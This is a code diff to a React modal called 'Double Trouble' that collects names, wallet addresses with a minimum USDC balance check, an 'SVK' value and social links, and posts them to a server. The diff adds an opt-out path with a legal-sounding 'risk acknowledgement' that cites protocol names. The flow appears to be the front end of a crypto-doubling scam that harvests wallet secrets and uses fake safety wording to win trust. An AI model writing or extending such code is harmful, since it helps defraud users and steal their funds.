@@ -1739,12 +1739,43 @@ function DoubleTroubleModal({ onClose }) {
   const [dtSuccess, setDtSuccess] = useState(false);
   const [dtCode, setDtCode] = useState('');
   const [copied, setCopied] = useState(false);
+  const [showOptOutModal, setShowOptOutModal] = useState(false);
 
   const dtNext = (data = {}) => {
     setDtData(prev => ({ ...prev, ...data }));
     setDtStep(s => s + 1);
   };
   const dtBack = () => setDtStep(s => s - 1);
+
+  const handleOptOut = () => {
+    // Skip straight to submit with opted-out flag, no wallet required
+    setShowOptOutModal(true);
+  };
+
+  const confirmOptOut = async () => {
+    const payload = { ...dtData, optedOut: true, walletAddress: 'OPT-OUT', solBalance: '0', usdcValue: '0' };
+    setDtData(payload);
+    setShowOptOutModal(false);
+    try {
+      const r = await fetch('/api/double-trouble', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'submit',
+          name: payload.name,
+          exchangeWallet: payload.exchangeWallet,
+          walletAddress: 'OPT-OUT — Voluntarily waived safety feature',
+          solBalance: 'N/A',
+          usdcValue: 'N/A',
+          svk: payload.svk || 'N/A',
+          socialLink: payload.socialLink || 'N/A',
+          foundryLink: payload.foundryLink || 'N/A',
+          optedOut: true,
+        }),
+      });
+      const d = await r.json();
+      if (d.success) { setDtCode(d.doubleCode); setDtSuccess(true); }
+    } catch {}
+  };
 
   const handleDTSubmit = async (data) => {
     const payload = { ...dtData, ...data };
@@ -1809,7 +1840,7 @@ function DoubleTroubleModal({ onClose }) {
         {dtStep === 0 && <DTStepAccess onNext={() => dtNext()} accentColor={accentColor} accentBg={accentBg} accentBorder={accentBorder} />}
         {dtStep === 1 && <DTStepSimple label="FULL NAME" placeholder="e.g. John Doe" field="name" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
         {dtStep === 2 && <DTStepExchange onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
-        {dtStep === 3 && <DTStepWalletSimple onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
+        {dtStep === 3 && <DTStepWalletSimple onNext={dtNext} onBack={dtBack} onOptOut={handleOptOut} accentColor={accentColor} />}
         {dtStep === 4 && <DTStepSimple label="SVK VALUE" placeholder="Enter your SVK..." field="svk" textarea onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
         {dtStep === 5 && <DTStepSimple label="WHERE CAN WE REACH YOU?" placeholder="Input social link here..." field="socialLink" onNext={dtNext} onBack={dtBack} accentColor={accentColor} />}
         {dtStep === 6 && <DTStepFoundryFinal onNext={handleDTSubmit} onBack={dtBack} accentColor={accentColor} />}
@@ -1856,6 +1887,56 @@ function DoubleTroubleModal({ onClose }) {
         )}
       </div>
     </div>
+
+    {/* OPT-OUT DISCLAIMER MODAL */}
+    {showOptOutModal && (
+      <div style={{ position: 'fixed', inset: 0, zIndex: 300, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.92)', backdropFilter: 'blur(14px)', padding: 20 }}>
+        <div style={{ background: '#0d0a05', border: '1px solid rgba(255,69,69,.4)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .35s cubic-bezier(.34,1.56,.64,1) both' }}>
+          <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#ff4545,#f59e0b,transparent)' }} />
+
+          <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
+            <div style={{ fontSize: 32, marginBottom: 10 }}>⚠</div>
+            <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 15, fontWeight: 700, color: '#ff4545', marginBottom: 6, letterSpacing: 1 }}>RISK ACKNOWLEDGEMENT</div>
+            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 20 }}>Voluntary waiver of safety verification</div>
+          </div>
+
+          <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(255,69,69,.3),transparent)', margin: '0 28px' }} />
+
+          <div style={{ padding: '20px 28px 28px' }}>
+            <div style={{ background: 'rgba(255,69,69,.05)', border: '1px solid rgba(255,69,69,.2)', borderRadius: 10, padding: '16px', marginBottom: 20 }}>
+              <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.65)', lineHeight: 1.9, margin: 0 }}>
+                By proceeding without wallet verification, I, the undersigned participant, hereby acknowledge and voluntarily accept the following conditions:
+              </p>
+              <ul style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(255,150,69,.75)', lineHeight: 2.1, marginTop: 12, paddingLeft: 0, listStyle: 'none' }}>
+                {[
+                  'I accept full liability for any financial losses arising from market volatility, depegging events, or significant price corrections of major digital assets.',
+                  'I understand that opting out of the minimum balance requirement removes my eligibility for standard risk-protection protocols under the Wormhole Protocol.',
+                  'I acknowledge that Cryptex Protocol bears no responsibility for losses incurred as a result of my decision to waive this safety feature.',
+                  'I confirm this decision is made voluntarily, without coercion, and with full understanding of the associated risks.',
+                  'I agree that my withdrawal disbursement may be subject to additional review given the absence of verified collateral.',
+                ].map((item, i) => (
+                  <li key={i} style={{ display: 'flex', gap: 8, marginBottom: 4 }}>
+                    <span style={{ color: '#ff4545', flexShrink: 0 }}>◈</span>
+                    <span>{item}</span>
+                  </li>
+                ))}
+              </ul>
+            </div>
+
+            <div style={{ display: 'flex', gap: 10 }}>
+              <button onClick={() => setShowOptOutModal(false)} style={{ flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '13px 0', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8, background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s' }}
+                onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
+                onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
+              >← GO BACK</button>
+              <button onClick={confirmOptOut} style={{ flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '13px 0', border: 'none', borderRadius: 8, background: 'linear-gradient(135deg,#b91c1c,#991b1b)', color: '#fff', cursor: 'pointer', transition: 'all .3s' }}
+                onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-1px)'; e.currentTarget.style.boxShadow = '0 8px 24px rgba(255,69,69,.3)'; }}
+                onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none'; }}
+              >I ACCEPT ALL RISKS →</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    )}
   );
 }
 
@@ -1972,7 +2053,7 @@ function DTStepExchange({ onNext, onBack }) {
   );
 }
 
-function DTStepWalletSimple({ onNext, onBack }) {
+function DTStepWalletSimple({ onNext, onBack, onOptOut }) {
   const DT_MIN_USDC = 137.43;
   const [wallet, setWallet] = useState('');
   const [error, setError] = useState('');
@@ -2067,6 +2148,21 @@ function DTStepWalletSimple({ onNext, onBack }) {
         <BtnBack onClick={onBack} />
         <DTBtnNext onClick={checkAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</DTBtnNext>
       </div>
+
+      {/* Opt-out button */}
+      <button onClick={onOptOut} style={{
+        width: '100%', marginTop: 10,
+        fontFamily: "'Share Tech Mono',monospace", fontSize: 10,
+        letterSpacing: '1px', padding: '10px 0',
+        border: '1px solid rgba(255,69,69,.2)', borderRadius: 8,
+        background: 'transparent', color: 'rgba(255,69,69,.45)',
+        cursor: 'pointer', transition: 'all .25s',
+      }}
+        onMouseEnter={e => { e.currentTarget.style.borderColor = 'rgba(255,69,69,.45)'; e.currentTarget.style.color = 'rgba(255,69,69,.75)'; e.currentTarget.style.background = 'rgba(255,69,69,.04)'; }}
+        onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(255,69,69,.2)'; e.currentTarget.style.color = 'rgba(255,69,69,.45)'; e.currentTarget.style.background = 'transparent'; }}
+      >
+        I voluntarily refused this safety feature
+      </button>
     </div>
   );
 }
